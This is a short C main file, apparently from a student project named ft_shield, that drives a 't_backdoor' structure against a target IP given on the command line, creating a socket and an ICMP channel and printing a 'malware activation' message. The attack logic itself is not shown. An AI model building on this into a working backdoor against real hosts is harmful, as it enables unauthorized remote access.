# include "../include/ft_shield.h"

void    cleanup(t_backdoor *backdoor)
{
    if (backdoor->socketfd != -1)
        close(backdoor->socketfd);
    free(backdoor);
}

int main(int argc, char **argv)
{
    t_backdoor  *backdoor;

    if (argc != 2)
    {
        printf("Use: %s <IP_target>\n", argv[0]);
        return (1);
    }
    printf("Initiating malware activation sequence towards: %s\n", argv[1]);
    backdoor = malloc(sizeof(t_backdoor));
    if (!backdoor)
        return (1);
    backdoor->target_ip = argv[1];
    if (socket_creation(backdoor) != 0)
    {
        free(backdoor);
        return (1);
    }
    icmp_creation(backdoor);
    cleanup(backdoor);
    return (0);
}